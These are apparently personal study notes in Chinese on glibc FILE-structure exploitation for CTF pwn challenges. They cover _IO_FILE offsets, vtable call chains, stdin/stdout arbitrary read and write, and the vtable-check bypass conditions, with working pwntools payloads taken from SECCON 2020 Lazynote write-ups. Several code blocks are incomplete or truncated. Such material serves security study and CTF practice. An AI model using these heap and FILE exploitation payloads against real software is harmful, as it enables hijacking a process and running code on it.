#### 相关结构

```python
#file结构

'amd64':{
    0x0:'_flags',
    0x8:'_IO_read_ptr',
    0x10:'_IO_read_end',
    0x18:'_IO_read_base',
    0x20:'_IO_write_base',
    0x28:'_IO_write_ptr',
    0x30:'_IO_write_end',
    0x38:'_IO_buf_base',
    0x40:'_IO_buf_end',
    0x48:'_IO_save_base',
    0x50:'_IO_backup_base',
    0x58:'_IO_save_end',
    0x60:'_markers',
    0x68:'_chain',
    0x70:'_fileno',
    0x74:'_flags2',
    0x78:'_old_offset',
    0x80:'_cur_column',
    0x82:'_vtable_offset',
    0x83:'_shortbuf',
    0x88:'_lock',
    0x90:'_offset',
    0x98:'_codecvt',
    0xa0:'_wide_data',
    0xa8:'_freeres_list',
    0xb0:'_freeres_buf',
    0xb8:'__pad5',
    0xc0:'_mode',
    0xc4:'_unused2',
    0xd8:'vtable'
}
```

```python

```

```

```



#### IO调用的vtable函数（略）



fread函数中调用的vtable函数有：

- `_IO_sgetn`函数调用了vtable的`_IO_file_xsgetn`。
- `_IO_doallocbuf`函数调用了vtable的`_IO_file_doallocate`以初始化输入缓冲区。
- vtable中的`_IO_file_doallocate`调用了vtable中的`__GI__IO_file_stat`以获取文件信息。
- `__underflow`函数调用了vtable中的`_IO_new_file_underflow`实现文件数据读取。
- vtable中的`_IO_new_file_underflow`调用了vtable`__GI__IO_file_read`最终去执行系统调用read

fwrite 函数调用的vtable函数有：

- `_IO_fwrite`函数调用了vtable的`_IO_new_file_xsputn`。
- `_IO_new_file_xsputn`函数调用了vtable中的`_IO_new_file_overflow`实现缓冲区的建立以及刷新缓冲区。
- vtable中的`_IO_new_file_overflow`函数调用了vtable的`_IO_file_doallocate`以初始化输入缓冲区。
- vtable中的`_IO_file_doallocate`调用了vtable中的`__GI__IO_file_stat`以获取文件信息。
- `new_do_write`中的`_IO_SYSWRITE`调用了vtable`_IO_new_file_write`最终去执行系统调用write。

`fclose`函数调用的vtable函数有：

- 在清空缓冲区的`_IO_do_write`函数中会调用vtable中的函数。
- 关闭文件描述符`_IO_SYSCLOSE`函数为vtable中的`__close`函数。
- `_IO_FINISH`函数为vtable中的`__finish`函数



#### stdin任意地址写

- 一开始是 read_ptr 和 end 相等，即可以理解为表示 输入缓冲区已经空了，所以向IO_buf_base写入
- 对IO_buf_base进行写入的时候，读入的数据要小于io_buf_size的大小，否则会直接调用read向目标内存写
- 输入到io_buf_base的时候，输入多少字节，io_read_end就加多少个字节 

```python
payload = p64(0x00000000fbad208b) + p64(stdin + 0x50) + p64(stdin + 0x50 - 68) + p64(stdin + 0x50) + p64(stdin)*3 + p64(stdout - 14) + p64(stdout + 0x100) + p64(0) + '1' + '\x00'*13 + '10'
```

这个payload，是向io_buf_base写入的，写入96个字节，end += 96 。这里是为了构造read_ptr < read_end的情况，想让数据从read_ptr继续读28个字节给目标缓冲区，所以就是96-68 = 28，这样就只会拷贝read_ptr开始处的28个字节到目标缓冲区，然后read_ptr和end相等，就misunderstanding认为缓冲区的数据已经拷贝完了，下次再读就是向伪造的io-buf-base也就是输入缓冲区写数据了，也就是任意地址写



所以如果想直接任意地址写，可以如下构造

1. 设置`_IO_read_end`等于`_IO_read_ptr`。        （构造misunderstanding认为需要更新输入缓冲区的内容）
2. 设置`_flag &~ _IO_NO_READS`即`_flag &~ 0x4`。
3. 设置`_fileno`为0。
4. 设置`_IO_buf_base`为`write_start`，`_IO_buf_end`为`write_end`；且使得`_IO_buf_end-_IO_buf_base`大于fread要读的数据



https://ptr-yudai.hatenablog.com/entry/2020/10/11/213127#Vulnerability-1

##### stdin 两个指针的情况分析***！！

- **read_ptr < read_end**

  - 会将read_ptr开始的数据拷贝到目标缓冲区

  - 并且当 end-ptr长度不够的时候，例如这里fget14个字节，但end-ptr == 10，则会等待请求继续输入

  - 而下次输入就到了buf_base上

    http://0gur1.cc/2018/09/25/IO-FILE%E7%9A%84%E5%88%A9%E7%94%A8/

    链接里的题目就是消耗_IO_read_ptr 使其++到 等于end，从而才继续向buf-base写

- **read_ptr >=  read_end**

  - 输入的内容缓存到_IO_buf_base，且你这次输入多少字节，对应的end += size，且最大为buf_size的大小
  - 下面出题人wp

##### Lazynote seccon-ctf-2020

输入这次payload的时候是已经构造 IO_BUF_base结尾为\x00，即buf_base < end,刚好指向stdin结构体

**且 read_ptr == read_end（默认）所以向buf_base写，也就是payload篡改了stdin**结构体

```python
#wp-1
payload = p64(0x00000000fbad208b) 
+ p64(stdin + 0x50) 
+ p64(stdin + 0x50 - 68) 
+ p64(stdin + 0x50) 
+ p64(stdin)*3 
+ p64(stdout - 14)                     # _IO_buf_base 对下一次 输入而言
+ p64(stdout + 0x100) 				   # _IO_buf_end
+ p64(0) + '1' + '\x00'*13 + '10'
# 这次的payload
```



```python
#出题人wp
payload = p64(0xfbad208b)
payload += p64(libc_base + libc.symbol('_IO_2_1_stdout_') + 0xd8)
payload += p64(libc_base + libc.symbol('_IO_2_1_stdout_')) * 6
payload += p64(libc_base + libc.symbol('_IO_2_1_stdout_') + 0x2000)
payload += b'\0' * (8*7 + 4) # padding
# 这里构造一次输入就可以利用stdin的任意地址写写到stdout的原因是

# 执行这次输入的时候 io_read_ptr == io_read_end
# 所以输入到io_buf_base, 由于这时候的io_buf_end - base的大小为0x84个字节，所以向io_buf更新0x84，也就是上面一部分的payload大小，更新之后，发现io_read_ptr = 0xd8 >  read_end ，所以继续向新的io_buf_base更新
# 所以这里上部分的payload也可以构造为
# 发送80个数据，更新end，发现相等即可满足 》= 条件，

payload = p64(0xfbad208b)
payload += p64(libc_base + libc.symbol('_IO_2_1_stdout_') + 0x80) #80 = 发送长度
payload += p64(libc_base + libc.symbol('_IO_2_1_stdout_')) * 6
payload += p64(libc_base + libc.symbol('_IO_2_1_stdout_') + 0x2000)
p.sendafter("> ", payload)
'''
'''

new_size = libc_base + next(libc.find("/bin/sh"))
payload += p64(0xfbad1800)
payload += p64(0) # _IO_read_ptr
payload += p64(0) # _IO_read_end
payload += p64(0) # _IO_read_base
payload += p64(0) # _IO_write_base
payload += p64((new_size - 100) // 2) # _IO_write_ptr
payload += p64(0) # _IO_write_end
payload += p64(0) # _IO_buf_base
payload += p64((new_size - 100) // 
·······
```

###### 两次输入和一次输入的细节差别

- 一次输入构造的是 读入size







#### stdout任意读

1. 设置`_flag &~ _IO_NO_WRITES`即`_flag &~ 0x8`。
2. 设置`_flag & _IO_CURRENTLY_PUTTING`即`_flag | 0x800`
3. 设置`_fileno`为1。
4. 设置`_IO_write_base`指向想要泄露的地方；`_IO_write_ptr`指向泄露结束的地址 （**之所以write_ptr是结束地址，是因为将自己的缓冲区拷贝数据到输出缓冲区，ptr是拷贝的结束位置   **）
5. 设置`_IO_read_end`等于`_IO_write_base`或设置`_flag & _IO_IS_APPENDING`即`_flag | 0x1000`。

所以seccon ctf这题由于

- 只有写单字节0的机会，所以 <u>**只能 **</u>构造      `_IO_read_end`等于`_IO_write_base`，因为这题已经有output过了，所以

_IO_CURRENTLY_PUTTING 是正常的

- 有的说法是说构造flag = 0x  XX1800，就是为了满足那几个flag的校验

```python
_flags = 0xfbad0000 
_flags &= ~_IO_NO_WRITES           ## _flags = 0xfbad0000 
_flags |= _IO_CURRENTLY_PUTTING    ## _flags = 0xfbad0800
_flags |= _IO_IS_APPENDING         ## _flags = 0xfbad1800  # 或设置 _IO_read_end == _IO_write_base
```

http://blog.eonew.cn/archives/1190







#### stdout任意写

前面提到对stdin来说，read_ptr <read_end 可以理解为系统认为输入缓冲区还有数据可以拷贝到目标缓冲区，所以从 fake 的 read_ptr 拷贝数据到目标缓冲区

**对stdout来说**

**write_ptr < write_end 就向 write_ptr的目标地址写内容，长度为end - ptr  **

所以综合来说就是在   调用输出的时候  ————》 write_ptr 到



#### 几个vtable函数调用链&条件

https://ray-cp.github.io/archivers/IO_FILE_vtable_check_and_bypass

##### _IO_overflow

```python
1.fp->_mode <= 0
2.fp->_IO_write_ptr > fp->_IO_write_base

####### 或
1._IO_vtable_offset (fp) == 0
2.fp->_mode > 0
3.fp->_wide_data->_IO_write_ptr > fp->_wide_data->_IO_write_base
```

```python
_flags = 0
_IO_write_ptr = 0x7fffffffffffffff
_IO_write_base = 0
_IO_buf_end = (binsh-100)/2   #如果binsh地址为奇数结尾，可以将地址+1
_IO_buf_base = 0
```

##### _IO_str_finish

```python
fp->_mode = 0
fp->_IO_write_ptr = 0xffffffff
fp->_IO_write_base = 0
fp->_IO_buf_base = binsh
fp->_flags2 = 0
fp->_mode = 0
vtable = _IO_str_jumps - 8 #因为本质上是通过调用伪造的overflow函数，即偏移成str_finish
```



#### 例题

##### Hctf2018 babyprintf_v2





##### 2018 ciscn echo

